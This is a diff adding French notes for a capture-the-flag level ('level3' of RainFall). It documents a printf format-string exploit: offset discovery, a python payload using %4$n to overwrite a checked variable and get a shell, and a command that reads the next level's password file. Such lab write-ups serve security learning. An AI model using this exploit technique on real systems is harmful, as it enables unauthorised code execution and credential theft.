@@ -1,0 +1,65 @@
+
+
+
+1. gdb level3 / disass main / disass v
+2. il y a un printf, on peut donc utlisé la technique de string attack, cela va nous permettre de pouvoir le modifier le contenue d'une adresse
+3. On remarque qu'en utilisant gdb si on jump a <v+64> on accède au shell
+4. 0x080484da <+54>:	mov    eax,ds:0x804988c
+   0x080484df <+59>:	cmp    eax,0x40
+   0x080484e2 <+62>:	jne    0x8048518 <v+116>
+
+   	eax est comparé a 0x40 -> 64 il va donc falloir remplacer la valeur stocker a l'adresse 0x804988c.
+
+	Il y a un printf on va donc faire une string attack.
+
+5. AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA %p %p %p %p
+   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141
+
+   Cela nous permet l'offset de notre argument le %x$n
+6. python -c 'print "\x8c\x98\x04\x08" + "a" * 60  + "%4$n"' > /tmp/stringattack
+	{
+		"\x8c\x98\x04\x08" => l'adresse que l'on souhaite modifier
+		"a" * 60 le nombre de caractère que nous allons mettre ( + \x8c\x98\x04\x08 = 64)
+		"%4$n"' => l'offset
+	}
+7. cat /tmp/stringattack - | ./level3
+8. cat /home/user/level4/.pass
+
+
+
+
+<!-- Avec gdb quand on jumpp a v+64 on accède a un shell, il faut donc réussir a le faire sans gdb.
+Dans la function v on voit que eax est comparé a 64, 
+
+=> 0x080484da <+54>:	mov    eax,ds:0x804988c
+   0x080484df <+59>:	cmp    eax,0x40
+   0x080484e2 <+62>:	jne    0x8048518 <v+116>
+
+ On va donc tenter de modifier la valeur stoké a l'adresse 0x804988c
+
+
+ python -c 'print "\x8c\x98\x04\x08" + "a" * 60  + "%4$n"' > /tmp/toto
+
+"\x8c\x98\x04\x08" => l'adresse que l'on souhaite modifier
+ "a" * 60 le nombre de caractère que nous allons mettre ( + \x8c\x98\x04\x08 = 64)
+ "%4$n"' => c'est l'offset auxquelle est l'addresse
+
+ level3@RainFall:~$ ./level3
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA %x %x %x %x %x %x %x %x %x %x %x %x
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 200 b7fd1ac0 b7ff37d0 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 25204141
+l'offset est donc 4.
+
+ cat /tmp/toto - | ./level3
+
+
+
+
+
+
+0x080484ff
+
+
+
+
+ 0x080484a4
+  python -c 'print "\xff\x48\x04\x08" + "\x08\x04\x84\xa4"  + "%4$n"' > /tmp/toto -->
